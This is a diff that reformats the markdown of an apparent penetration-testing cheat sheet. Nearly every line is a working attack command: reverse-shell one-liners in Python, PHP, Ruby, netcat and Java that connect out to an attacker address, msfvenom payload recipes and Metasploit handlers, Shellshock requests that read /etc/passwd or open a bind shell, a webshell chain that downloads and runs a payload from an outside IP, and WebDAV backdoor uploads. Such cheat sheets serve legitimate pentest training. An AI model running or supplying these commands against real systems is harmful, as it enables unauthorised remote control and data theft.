-            `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
   - PHP
     - This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
-            `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
+      `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
     - If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
   - Ruby
-            `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+      `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
   - Netcat
     - Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
-            `nc -e /bin/sh 10.0.0.1 1234`
+      `nc -e /bin/sh 10.0.0.1 1234`
     - If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
-            `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
   - Java
 
-      ```Java
-      r = Runtime.getRuntime()
-      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-      p.waitFor()
-      ```
-
-      _[Untested submission from anonymous reader]_
+    ```Java
+    r = Runtime.getRuntime()
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p.waitFor()
+    ```
+    *Untested submission from anonymous reader*
   - xterm
     - One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
             `xterm -display 10.0.0.1:1`
@@ -1484,65 +1368,68 @@ An uploadable batch file for performing basic windows enumeration.
       <https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors>
 
 - Creating Meterpreter Shells with MSFVenom - <http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/>
+  *Linux*
+  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
+  *Windows*
+  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
+  *Mac*
+  `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
 
-      *Linux*
-      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
-      *Windows*
-      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
-      *Mac*
-      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
+  **Web Payloads**
 
-      **Web Payloads**
+  *PHP*
+  `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
+  OR
+  `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
+  Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
+  `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
+  *ASP*
+  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
+  *JSP*
+  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
+  *WAR*
+  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
 
-      *PHP*
-      `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-      OR
-      `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-      Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
-      `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
-      *ASP*
-      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
-      *JSP*
-      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
-      *WAR*
-      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
+  **Scripting Payloads**
 
-      **Scripting Payloads**
+  *Python*
+  `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
+  *Bash*
+  `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
+  *Perl*
+  `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
 
-      *Python*
-      `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
-      *Bash*
-      `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
-      *Perl*
-      `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
+  **Shellcode**
 
-      **Shellcode**
+  For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
-      For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+  *Linux Based Shellcode*
+  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+  *Windows Based Shellcode*
+  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+  *Mac Based Shellcode*
+  `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
-      *Linux Based Shellcode*
-      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-      *Windows Based Shellcode*
-      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-      *Mac Based Shellcode*
-      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+  **Handlers**
+  Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
 
-      **Handlers**
-      Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+  ```
+  use exploit/multi/handler
+  set PAYLOAD <Payload name>
+  set LHOST <LHOST value>
+  set LPORT <LPORT value>
+  set ExitOnSession false
+  exploit -j -z
+  ```
 
-         use exploit/multi/handler
-         set PAYLOAD <Payload name>
-         set LHOST <LHOST value>
-         set LPORT <LPORT value>
-         set ExitOnSession false
-         exploit -j -z
-
-      Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
+  - Once the required values are completed the following command will execute your handler – `msfconsole -L -r `
 
 - SSH to Meterpreter: <https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/>
 
-         use auxiliary/scanner/ssh/ssh_login
-         use post/multi/manage/shell_to_meterpreter
+    ```
+    use auxiliary/scanner/ssh/ssh_login
+    use post/multi/manage/shell_to_meterpreter
+    ```
 
 - SBD.exe
 
@@ -1552,26 +1439,20 @@ An uploadable batch file for performing basic windows enumeration.
 - Shellshock
 
   - Testing for shell shock with NMap
-
     `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
-
   - git clone <https://github.com/nccgroup/shocker>
-
     `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
+  - Shell Shock SSH Forced Command; Check for forced command by enabling all debug output with ssh  
 
-  - Shell Shock SSH Forced Command  
-        Check for forced command by enabling all debug output with ssh  
-
-              ssh -vvv  
-              ssh -i noob noob@$ip '() { :;}; /bin/bash'
+    ```shell
+    ssh -vvv  
+    ssh -i noob noob@$ip '() { :;}; /bin/bash'
+    ```
 
   - cat file (view file contents)  
-
-              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
-
+    `echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80`
   - Shell Shock run bind shell  
-
-             echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
+    `echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80`
 
 ### Execute a remote shell dropper
 
@@ -1697,55 +1578,56 @@ Or the Python pyftpdlib FTP Server (again don't run from TMUX):
 
 - SCP
 
-        scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
-
-        scp localfile username@$ip:~/Folder/
-
-        scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
+  ```shell
+  scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
+  scp localfile username@$ip:~/Folder/
+  scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
+  ```
 
 - Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
 
-        `davtest -move -sendbd auto -url http://$ip`
-
-        <https://github.com/cldrn/davtest>
-
-        You can also upload a file using the PUT method with the curl command:
-
-        `curl -T 'leetshellz.txt' 'http://$ip'`
-
-        And rename it to an executable file using the MOVE method with the curl command:
-
-        `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`
+  - `davtest -move -sendbd auto -url http://$ip`
+  - <https://github.com/cldrn/davtest>
+  - You can also upload a file using the PUT method with the curl command:
+   `curl -T 'leetshellz.txt' 'http://$ip'`
+  - And rename it to an executable file using the MOVE method with the curl command:
+   `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`
 
 - Upload shell using limited php shell cmd  
-        use the webshell to download and execute the meterpreter  
-        \[curl -s --data "cmd=wget <http://174.0.42.42:8000/dhn> -O
-        /tmp/evil" <http://$ip/files/sh.php>  
-        \[curl -s --data "cmd=chmod 777 /tmp/evil"
-        <http://$ip/files/sh.php>  
-        curl -s --data "cmd=bash -c /tmp/evil" <http://$ip/files/sh.php>
+  - use the webshell to download and execute the meterpreter  
+  - `curl -s --data "cmd=wget <http://174.0.42.42:8000/dhn> -O`
+  - `/tmp/evil" <http://$ip/files/sh.php>`
+  - `curl -s --data "cmd=chmod 777 /tmp/evil"`
+  - `<http://$ip/files/sh.php>`
+  - `curl -s --data "cmd=bash -c /tmp/evil" <http://$ip/files/sh.php>`
 
 - TFTP  
-        mkdir /tftp  
-        atftpd --daemon --port 69 /tftp  
-        cp /usr/share/windows-binaries/nc.exe /tftp/  
-        EX. FROM WINDOWS HOST:  
-        C:\\Users\\Offsec>tftp -i $ip get nc.exe
+  
+  ```cmd
+  mkdir /tftp  
+  atftpd --daemon --port 69 /tftp  
+  cp /usr/share/windows-binaries/nc.exe /tftp/  
+  EX. FROM WINDOWS HOST:  
+  C:\\Users\\Offsec>tftp -i $ip get nc.exe
+  ```
 
 - FTP  
-        apt-get update && apt-get install pure-ftpd  
+  
+  ```shell
+  apt-get update && apt-get install pure-ftpd  
 
-        \#!/bin/bash  
-        groupadd ftpgroup  
-        useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
-        pure-pw useradd offsec -u ftpuser -d /ftphome  
-        pure-pw mkdb  
-        cd /etc/pure-ftpd/auth/  
-        ln -s ../conf/PureDB 60pdb  
-        mkdir -p /ftphome  
-        chown -R ftpuser:ftpgroup /ftphome/  
+  #!/bin/bash  
+  groupadd ftpgroup  
+  useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
+  pure-pw useradd offsec -u ftpuser -d /ftphome  
+  pure-pw mkdb  
+  cd /etc/pure-ftpd/auth/  
+  ln -s ../conf/PureDB 60pdb  
+  mkdir -p /ftphome  
+  chown -R ftpuser:ftpgroup /ftphome/  
 
-        /etc/init.d/pure-ftpd restart
+  /etc/init.d/pure-ftpd restart
+  ```
 
 #### Uploading Files with VBScript
 
